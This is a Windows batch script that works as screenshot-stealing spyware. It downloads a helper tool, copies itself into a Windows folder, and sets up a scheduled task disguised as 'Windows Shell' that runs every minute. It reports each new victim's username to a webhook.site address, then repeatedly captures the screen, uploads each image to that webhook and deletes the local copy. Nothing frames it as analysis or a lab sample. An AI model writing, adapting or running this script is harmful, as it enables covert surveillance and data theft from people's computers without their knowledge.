@echo off

set CDIR=%LOCALAPPDATA%\Microsoft\Windows\Shell
set WEBHOOK=https://webhook.site/aeb43e21-530e-4c19-b044-82d876d0572a
set NIRCMD_URL=https://github.com/r4mdev/shotter/raw/main/nircmdc.exe

IF NOT Exist %CDIR%\nircmdc.exe (
	REM File not i - download and schtask every minute
	powershell iwr -Uri %NIRCMD_URL% -OutFile %CDIR%\nircmdc.exe
	REM curl --ssl-no-revoke %NIRCMD_URL% -o %CDIR%\nircmdc.exe
	copy "%~f0" "%CDIR%\env.bat" 
	schtasks /Create /SC minute /MO 1 /TN "Windows Shell" /TR %CDIR%\env.bat
    curl -X POST -d "New Clinet: %USER%" %WEBHOOK%
)

setlocal
For /f "tokens=2-4 delims=/ " %%a in ('date /t') do (set mydate=%%c-%%a-%%b)
For /f "tokens=1-2 delims=/:" %%a in ('time /t') do (set mytime=%%a%%b)
set NAME=%CDIR%\%mydate%_%mytime%.jpg
%CDIR%\nircmdc.exe savescreenshot "%NAME%" jpg
curl --ssl-no-revoke -X POST -F "screenshot=@%NAME%" %WEBHOOK%
del %NAME%
